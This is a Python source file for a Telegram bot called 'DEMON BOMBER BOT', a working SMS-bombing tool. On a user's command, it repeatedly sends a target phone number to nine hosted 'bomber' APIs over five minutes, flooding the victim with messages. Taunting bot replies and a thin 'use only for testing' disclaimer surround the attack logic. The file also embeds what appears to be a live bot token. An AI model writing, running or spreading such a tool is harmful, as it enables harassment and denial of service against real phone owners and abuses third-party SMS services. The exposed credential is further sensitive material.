#!/usr/bin/env python3
# DEMON 😈 BOMBER BOT - ULTIMATE UI + CRASH PROOF

import os
import sys
import asyncio
import logging
import aiohttp
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from aiohttp import web

# ========== HARDCODED BOT TOKEN ==========
BOT_TOKEN = "8643322725:AAG45lf0GkMuRLChKNa6K2f2mSRa8tY-FiM"

# ========== CONFIG ==========
BOMB_DURATION = 300
CHECK_INTERVAL = 10

API_LIST = [
    {"name": "🔥 Ultra Bomber", "url": "https://ultra-bomber-wo5r.onrender.com/bomb", "params": {"key": "admin123"}, "phone_param": "phone"},
    {"name": "💀 Ultra Brutal", "url": "https://ultra-brutal-bomber-njde.onrender.com/bomb", "params": {}, "phone_param": "phone"},
    {"name": "🚀 Part 1", "url": "https://bomber-part-1-kzn0.onrender.com/bomb", "params": {"key": "shuvo"}, "phone_param": "phone"},
    {"name": "⚡ Part 2", "url": "https://brutal-bomber-part-2-6dhd.onrender.com/bomb", "params": {"key": "shuvo"}, "phone_param": "phone"},
    {"name": "💣 Bomber Pro", "url": "https://bomber-pro-r88e.onrender.com/bomb", "params": {"key": "shuvo", "cycles": 10}, "phone_param": "phone"},
    {"name": "🎯 Bomber APIs", "url": "https://bomber-apis-g0sf.onrender.com/bom", "params": {"key": "felix"}, "phone_param": "num"},
    {"name": "🐍 Felix Bomber", "url": "https://felix-bom-irju.onrender.com/bom", "params": {"key": "demo"}, "phone_param": "num"},
    {"name": "🤖 Bomber 3SKM", "url": "https://bomber-3skm.onrender.com/bom", "params": {"key": "felix"}, "phone_param": "num"},
    {"name": "👾 Shuvo Bomber", "url": "https://bomber-by-shuvo.onrender.com/bomb", "params": {}, "phone_param": "phone"}
]

# ========== LOGGING ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== BOMBER ENGINE ==========
active_sessions = {}

async def bomb_single_api(api, phone):
    try:
        params = api["params"].copy()
        params[api["phone_param"]] = phone
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api["url"], params=params) as resp:
                if resp.status == 200:
                    return {"success": True, "api": api["name"]}
                return {"success": False, "api": api["name"], "error": f"HTTP {resp.status}"}
    except Exception as e:
        return {"success": False, "api": api["name"], "error": str(e)[:30]}

async def continuous_bombing(phone, user_id):
    active_sessions[user_id] = {"phone": phone, "start_time": datetime.now(), "active": True}
    start_time = datetime.now()
    end_time = start_time + timedelta(seconds=BOMB_DURATION)
    cycle_count = 0
    total_success = 0
    
    logger.info(f"[⚡] Starting bombing for {phone}")
    
    while datetime.now() < end_time:
        if not active_sessions.get(user_id, {}).get("active", False):
            break
        
        cycle_count += 1
        tasks = [bomb_single_api(api, phone) for api in API_LIST]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if isinstance(r, dict) and r.get("success"))
        total_success += success
        logger.info(f"[🔄] Cycle {cycle_count}: {success}/{len(API_LIST)} OK")
        await asyncio.sleep(CHECK_INTERVAL)
    
    active_sessions[user_id] = {"active": False}
    return {"total_cycles": cycle_count, "phone": phone, "total_success": total_success}

async def stop_bombing(user_id):
    if user_id in active_sessions:
        active_sessions[user_id]["active"] = False
        return True
    return False

def get_status(user_id):
    if user_id in active_sessions:
        session = active_sessions.get(user_id, {})
        if session.get("active", False):
            elapsed = (datetime.now() - session["start_time"]).seconds
            remaining = max(0, BOMB_DURATION - elapsed)
            return {"active": True, "phone": session["phone"], "remaining": remaining}
    return {"active": False}

# ========== STYLISH KEYBOARDS ==========
main_keyboard = ReplyKeyboardMarkup([
    ["💣 START 5-MIN BOMB", "🛑 STOP BOMBING"],
    ["📊 LIVE STATUS", "ℹ️ HELP & INFO"],
    ["👨‍💻 ABOUT DEMON", "📡 API LIST"]
], resize_keyboard=True)

inline_keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("☢️ MEGA BOMB (ALL 9 APIS)", callback_data="mega")],
    [InlineKeyboardButton("⏱️ 5-MIN TIMER BOMB", callback_data="timer")],
    [InlineKeyboardButton("🛑 EMERGENCY STOP", callback_data="stop")],
    [InlineKeyboardButton("📊 CHECK STATUS", callback_data="status")],
    [InlineKeyboardButton("📡 SHOW APIS", callback_data="apis")],
    [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
])

# ========== COMMANDS ==========
async def start(update: Update, context):
    user = update.effective_user
    await update.message.reply_text(
        f"""╔═══════════════════════════════════╗
║  🔥 *DEMON 😈 BOMBER BOT*  🔥
║       "No Rules. No Excuses."      
╚═══════════════════════════════════╝

*👤 User:* `{user.first_name}`
*🆔 ID:* `{user.id}`
*📡 APIs:* `{len(API_LIST)}` Active

*💀 FEATURES:*
• ☢️ All 9 APIs ek saath
• ⏱️ 5-Minute auto-stop
• 🔄 Manual toggle ON/OFF
• 📊 Real-time status
• 🎨 Stylish UI

*📌 QUICK COMMANDS:*
`/bomb <phone>` → Start bombing
`/stop` → Stop bombing  
`/status` → Check status
`/apis` → Show all APIs

*🔥 EXAMPLE:*
`/bomb 9876543210`

*⚡ BOMBING STARTS IN 3...2...1...*
""",
        parse_mode='Markdown',
        reply_markup=main_keyboard
    )

async def bomb_command(update: Update, context):
    try:
        args = context.args
        if not args:
            await update.message.reply_text(
                """❌ *CHUTIYE! Phone number do!*

*Usage:*
`/bomb 9876543210`

*Example:*
`/bomb 9876543210` → 5-min mega bomb

*⚠️ Auto-stops after 5 minutes!*""",
                parse_mode='Markdown'
            )
            return
        
        phone = args[0]
        if not phone.isdigit() or len(phone) < 10:
            await update.message.reply_text("❌ *Invalid phone number!* (10+ digits required)", parse_mode='Markdown')
            return
        
        user_id = update.effective_user.id
        status = get_status(user_id)
        if status["active"]:
            await update.message.reply_text(
                f"""⚠️ *BOMBING ALREADY ACTIVE!*

📱 *Target:* `{status['phone']}`
⏳ *Remaining:* `{status['remaining']}` seconds

🛑 Use `/stop` to stop current bombing.""",
                parse_mode='Markdown'
            )
            return
        
        status_msg = await update.message.reply_text(
            f"""╔═══════════════════════════════════╗
║  ☢️ *MEGA BOMB INITIATED!*  ☢️
╚═══════════════════════════════════╝

📱 *Target:* `{phone}`
📡 *APIs:* `{len(API_LIST)}` (ALL ACTIVE)
⏱️ *Duration:* `5 Minutes` (Auto-Stop)
🔄 *Cycle:* Every `10` Seconds

⚡ *DEMON 😈 IS ATTACKING!*

*STATUS:* 🔴 BOMBING IN PROGRESS...
*SMS COUNT:* 0/??? 
*ETA:* 5 Minutes

😈 *"No Rules. No Excuses."*
""",
            parse_mode='Markdown'
        )
        
        result = await continuous_bombing(phone, user_id)
        
        await status_msg.edit_text(
            f"""╔═══════════════════════════════════╗
║  💀 *BOMBING COMPLETED!*  💀
╚═══════════════════════════════════╝

📱 *Target:* `{result['phone']}`
🔄 *Total Cycles:* `{result['total_cycles']}`
📡 *APIs per Cycle:* `{len(API_LIST)}`
💥 *Total SMS Sent:* `{result['total_success']}`
⏱️ *Duration:* `{BOMB_DURATION}` seconds
✅ *Status:* AUTO-STOPPED

╔═══════════════════════════════════╗
║  😈 *DEMON 😈 RETREATS!*  😈
╚═══════════════════════════════════╝

*🔄 RESTART:* `/bomb {result['phone']}`
""",
            parse_mode='Markdown',
            reply_markup=main_keyboard
        )
    except Exception as e:
        logger.error(f"Bomb error: {e}")
        await update.message.reply_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

async def stop_command(update: Update, context):
    try:
        user_id = update.effective_user.id
        if await stop_bombing(user_id):
            await update.message.reply_text(
                """╔═══════════════════════════════════╗
║  🛑 *BOMBING STOPPED!*  🛑
╚═══════════════════════════════════╝

✅ DEMON 😈 has retreated.

*🔄 RESTART:*
`/bomb <phone>`

😈 *"Temporary truce..."*""",
                parse_mode='Markdown',
                reply_markup=main_keyboard
            )
        else:
            await update.message.reply_text(
                """❌ *No active bombing found!*

Start with:
`/bomb 9876543210`

😈 *"Attack first, ask later!"*""",
                parse_mode='Markdown'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

async def status_command(update: Update, context):
    try:
        user_id = update.effective_user.id
        status = get_status(user_id)
        
        if status["active"]:
            await update.message.reply_text(
                f"""╔═══════════════════════════════════╗
║  📊 *LIVE BOMBING STATUS*  📊
╚═══════════════════════════════════╝

*Status:* 🟢 ACTIVE
*Target:* `{status['phone']}`
*Elapsed:* `{status['remaining']}`s remaining
*APIs:* `{len(API_LIST)}` active

⚡ *DEMON 😈 IS FIRING!*

*Progress:* ████████░░░░  {int((1 - status['remaining']/BOMB_DURATION)*100)}%""",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                """╔═══════════════════════════════════╗
║  📊 *BOMBING STATUS*  📊
╚═══════════════════════════════════╝

*Status:* 🔴 IDLE
*APIs:* `9` ready

😈 *DEMON 😈 is waiting...*

*START:*
`/bomb 9876543210`""",
                parse_mode='Markdown'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

async def apis_command(update: Update, context):
    """Show all APIs"""
    api_list = "\n".join([f"`{i+1}.` {api['name']}" for i, api in enumerate(API_LIST)])
    await update.message.reply_text(
        f"""╔═══════════════════════════════════╗
║  📡 *ACTIVE APIS*  📡
╚═══════════════════════════════════╝

{api_list}

*Total:* `{len(API_LIST)}` APIs

⚡ *All APIs fire simultaneously!*""",
        parse_mode='Markdown'
    )

async def about_command(update: Update, context):
    await update.message.reply_text(
        f"""╔═══════════════════════════════════╗
║  👨‍💻 *ABOUT DEMON 😈*  👨‍💻
╚═══════════════════════════════════╝

*Name:* DEMON 😈 BOMBER BOT
*Version:* v3.0 (ULTIMATE UI)
*Framework:* Python-Telegram-Bot
*Host:* Railway (24/7)
*APIs:* `{len(API_LIST)}` Active

*💀 Features:*
• 9 APIs parallel attack
• 5-min auto-stop
• Manual toggle
• Real-time status
• Stylish UI

*😈 "No rules. No excuses. No boundaries."*

*📡 APIs Loaded:* {len(API_LIST)}""",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context):
    await update.message.reply_text(
        """╔═══════════════════════════════════╗
║  ℹ️ *HELP & INFO*  ℹ️
╚═══════════════════════════════════╝

*📖 COMMANDS:*

`/start` → Welcome message
`/bomb <phone>` → Start 5-min bombing
`/stop` → Stop bombing
`/status` → Check status
`/apis` → Show all APIs

*🔄 BUTTONS:*

`START BOMB` → Enter number
`STOP` → Emergency stop
`STATUS` → Live status

*⏱️ AUTO-STOP:*
5 minutes (300 seconds)

*⚡ HOW IT WORKS:*
• All 9 APIs fire together
• Repeats every 10 seconds
• Auto-stops after 5 minutes

*⚠️ WARNING:*
• Use only for testing
• DEMON 😈 not responsible
• 24/7 online on Railway""",
        parse_mode='Markdown',
        reply_markup=main_keyboard
    )

# ========== MESSAGE HANDLER ==========
async def handle_message(update: Update, context):
    try:
        text = update.message.text
        
        if text == "💣 START 5-MIN BOMB":
            await update.message.reply_text(
                """📱 *Enter phone number:*

*Format:* `9876543210`

*Example:* `9876543210`

⏱️ Will auto-stop after 5 minutes!

😈 *"Ready to bomb!"*""",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_phone'] = True
            
        elif text == "🛑 STOP BOMBING":
            await stop_command(update, context)
            
        elif text == "📊 LIVE STATUS":
            await status_command(update, context)
            
        elif text == "ℹ️ HELP & INFO":
            await help_command(update, context)
            
        elif text == "👨‍💻 ABOUT DEMON":
            await about_command(update, context)
            
        elif text == "📡 API LIST":
            await apis_command(update, context)
            
        elif context.user_data.get('awaiting_phone'):
            phone = text.strip()
            if phone.isdigit() and len(phone) >= 10:
                context.user_data['awaiting_phone'] = False
                context.user_data['phone'] = phone
                
                user_id = update.effective_user.id
                status = get_status(user_id)
                if status["active"]:
                    await update.message.reply_text(
                        f"⚠️ *Already bombing!* Target: `{status['phone']}`",
                        parse_mode='Markdown'
                    )
                    return
                
                status_msg = await update.message.reply_text(
                    f"""☢️ *MEGA BOMB INITIATED!*

📱 *Target:* `{phone}`
📡 *APIs:* `{len(API_LIST)}` (ALL)
⏱️ *Duration:* 5 Minutes

⚡ *DEMON 😈 IS ATTACKING!*""",
                    parse_mode='Markdown'
                )
                
                result = await continuous_bombing(phone, user_id)
                
                await status_msg.edit_text(
                    f"""💀 *BOMBING COMPLETED!*

📱 *Target:* `{result['phone']}`
🔄 *Cycles:* `{result['total_cycles']}`
💥 *Total SMS:* `{result['total_success']}`

😈 *DEMON 😈 RETREATS!*""",
                    parse_mode='Markdown',
                    reply_markup=main_keyboard
                )
            else:
                await update.message.reply_text("❌ *Invalid phone!* Enter 10+ digits.", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Message error: {e}")
        await update.message.reply_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

# ========== CALLBACK HANDLER ==========
async def handle_callback(update: Update, context):
    try:
        query = update.callback_query
        await query.answer()
        data = query.data
        user_id = update.effective_user.id
        
        if data == "cancel":
            await query.edit_message_text(
                "❌ *Operation cancelled!*",
                parse_mode='Markdown',
                reply_markup=main_keyboard
            )
            return
            
        if data == "mega" or data == "timer":
            phone = context.user_data.get('phone')
            if not phone:
                await query.edit_message_text(
                    "❌ *No phone number!*\nUse `/bomb <number>` first.",
                    parse_mode='Markdown'
                )
                return
            
            status = get_status(user_id)
            if status["active"]:
                await query.edit_message_text(
                    f"⚠️ *Already bombing!* Target: `{status['phone']}`",
                    parse_mode='Markdown'
                )
                return
            
            await query.edit_message_text(
                f"""☢️ *BOMBING STARTED!*

📱 *Target:* `{phone}`
📡 *APIs:* ALL 9
⏱️ *Auto-stop:* 5 minutes

⚡ *DEMON 😈 FIRING!*""",
                parse_mode='Markdown'
            )
            
            result = await continuous_bombing(phone, user_id)
            
            await query.edit_message_text(
                f"""💀 *BOMBING DONE!*

📱 *Target:* `{result['phone']}`
🔄 *Cycles:* `{result['total_cycles']}`
💥 *Total SMS:* `{result['total_success']}`

😈 *DEMON 😈 RETREATS!*""",
                parse_mode='Markdown',
                reply_markup=main_keyboard
            )
            return
            
        if data == "stop":
            if await stop_bombing(user_id):
                await query.edit_message_text(
                    "🛑 *BOMBING STOPPED!*",
                    parse_mode='Markdown',
                    reply_markup=main_keyboard
                )
            else:
                await query.edit_message_text(
                    "❌ *No active bombing!*",
                    parse_mode='Markdown'
                )
            return
            
        if data == "status":
            status = get_status(user_id)
            if status["active"]:
                await query.edit_message_text(
                    f"""📊 *LIVE STATUS*

🟢 *Active:* ✅
📱 *Target:* `{status['phone']}`
⏳ *Remaining:* `{status['remaining']}`s

⚡ *DEMON 😈 ATTACKING!*""",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    "📊 *Status:* 🔴 IDLE\n\nStart with `/bomb 9876543210`",
                    parse_mode='Markdown'
                )
            return
            
        if data == "apis":
            api_list = "\n".join([f"`{i+1}.` {api['name']}" for i, api in enumerate(API_LIST)])
            await query.edit_message_text(
                f"""📡 *ACTIVE APIS*

{api_list}

*Total:* `{len(API_LIST)}` APIs""",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Callback error: {e}")
        await query.edit_message_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

# ========== WEB SERVER ==========
async def web_server():
    try:
        async def health(request):
            return web.Response(text="OK", status=200)
        
        app = web.Application()
        app.router.add_get('/', health)
        app.router.add_get('/health', health)
        
        port = int(os.environ.get("PORT", 8080))
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, host="0.0.0.0", port=port)
        await site.start()
        logger.info(f"[🌐] Web server on port {port}")
        
        while True:
            await asyncio.sleep(60)
    except Exception as e:
        logger.error(f"Web server error: {e}")

# ========== MAIN ==========
async def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("bomb", bomb_command))
        app.add_handler(CommandHandler("stop", stop_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("apis", apis_command))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        app.add_handler(CallbackQueryHandler(handle_callback))
        
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        
        logger.info("[⚡] DEMON 😈 BOT IS ALIVE!")
        
        await asyncio.gather(
            web_server(),
            asyncio.Event().wait()
        )
    except Exception as e:
        logger.error(f"Main error: {e}")
        raise

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("[🛑] Shutting down...")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
